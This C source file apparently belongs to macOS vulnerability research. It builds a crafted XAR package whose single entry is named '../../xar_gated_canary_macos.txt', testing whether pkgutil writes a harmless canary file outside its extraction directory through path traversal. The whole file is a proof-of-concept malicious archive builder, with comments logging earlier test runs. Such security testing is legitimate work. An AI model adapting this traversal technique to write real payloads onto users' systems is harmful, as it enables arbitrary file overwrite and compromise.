/*
 * build_xar_r39.c — dot-dot (../) path traversal
 *
 * XAR structure (flat, single top-level FILE):
 *   id=1  FILE  "../../xar_gated_canary_macos.txt"
 *
 * pkgutil does not sanitize '/' in filenames (run37 confirmed).
 * Hypothesis: pkgutil opens $OUTDIR/../../xar_gated_canary_macos.txt
 *             = /tmp/xar_gated_canary_macos.txt (since OUTDIR is 2 levels below /tmp)
 *             '..' is not a symlink → O_NOFOLLOW_ANY does not block.
 *
 * xar CLI: converts '/' to ':' → filename becomes '..:..:canary.txt' (harmless).
 *
 * Checksum: SHA1(compressed_TOC) — verified correct in run38c.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <CommonCrypto/CommonDigest.h>
#include <zlib.h>

#define XAR_MAGIC      0x78617221u
#define XAR_HDR_SIZE   28
#define CKSUM_ALG_SHA1 1

typedef struct __attribute__((packed)) {
    uint32_t magic;
    uint16_t size;
    uint16_t version;
    uint64_t toc_len_compressed;
    uint64_t toc_len_uncompressed;
    uint32_t cksum_alg;
} xar_header_t;

static uint64_t htonll64(uint64_t v) {
    return (((uint64_t)htonl((uint32_t)(v >> 32))) |
            ((uint64_t)htonl((uint32_t)(v & 0xFFFFFFFFu)) << 32));
}

int main(void) {
    /* Payload */
    const char *payload = "XAR_DOTDOT_GATE_A_RUN39\n";
    size_t payload_len  = strlen(payload);

    /* Compress payload */
    uLong czbound = compressBound((uLong)payload_len);
    unsigned char *cz = malloc(czbound);
    uLong czlen = czbound;
    if (compress2(cz, &czlen, (const Bytef *)payload, (uLong)payload_len, 9) != Z_OK) {
        fprintf(stderr, "compress2 payload failed\n"); return 1;
    }

    /* TOC XML — single flat FILE with dot-dot name */
    char toc_xml[4096];
    int tl = snprintf(toc_xml, sizeof(toc_xml),
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        "<xar><toc>"
          "<checksum style=\"sha1\">"
            "<offset>0</offset><size>20</size>"
          "</checksum>"
          "<file id=\"1\">"
            "<name>../../xar_gated_canary_macos.txt</name>"
            "<type>file</type>"
            "<data>"
              "<offset>20</offset>"
              "<size>%zu</size>"
              "<length>%zu</length>"
              "<encoding style=\"application/x-gzip\"/>"
            "</data>"
          "</file>"
        "</toc></xar>",
        payload_len, (size_t)czlen);

    if (tl < 0 || (size_t)tl >= sizeof(toc_xml)) {
        fprintf(stderr, "TOC buffer too small\n"); return 1;
    }
    size_t toc_len = (size_t)tl;

    /* Compress TOC */
    uLong toc_czbound = compressBound((uLong)toc_len);
    unsigned char *toc_cz = malloc(toc_czbound);
    uLong toc_czlen = toc_czbound;
    if (compress2(toc_cz, &toc_czlen,
                  (const Bytef *)toc_xml, (uLong)toc_len, 9) != Z_OK) {
        fprintf(stderr, "compress2 TOC failed\n"); return 1;
    }

    /* CORRECT SHA1: hash of compressed TOC (verified in run38c) */
    unsigned char sha1[CC_SHA1_DIGEST_LENGTH];
    CC_SHA1(toc_cz, (CC_LONG)toc_czlen, sha1);

    /* Header */
    xar_header_t hdr;
    hdr.magic                = htonl(XAR_MAGIC);
    hdr.size                 = htons(XAR_HDR_SIZE);
    hdr.version              = htons(1);
    hdr.toc_len_compressed   = htonll64((uint64_t)toc_czlen);
    hdr.toc_len_uncompressed = htonll64((uint64_t)toc_len);
    hdr.cksum_alg            = htonl(CKSUM_ALG_SHA1);

    /* Write XAR */
    FILE *f = fopen("gate_a39.pkg", "wb");
    if (!f) { perror("fopen"); return 1; }
    fwrite(&hdr,   sizeof(hdr), 1, f);
    fwrite(toc_cz, 1, (size_t)toc_czlen, f);
    fwrite(sha1,   1, sizeof(sha1), f);   /* heap[0..19] = checksum */
    fwrite(cz,     1, (size_t)czlen, f);  /* heap[20..] = payload   */
    fclose(f);

    printf("gate_a39.pkg: toc_cz=%lu payload=%zu->%lu sha1=",
           (unsigned long)toc_czlen, payload_len, (unsigned long)czlen);
    for (int i = 0; i < CC_SHA1_DIGEST_LENGTH; i++) printf("%02x", sha1[i]);
    printf("\n");
    free(cz); free(toc_cz);
    return 0;
}
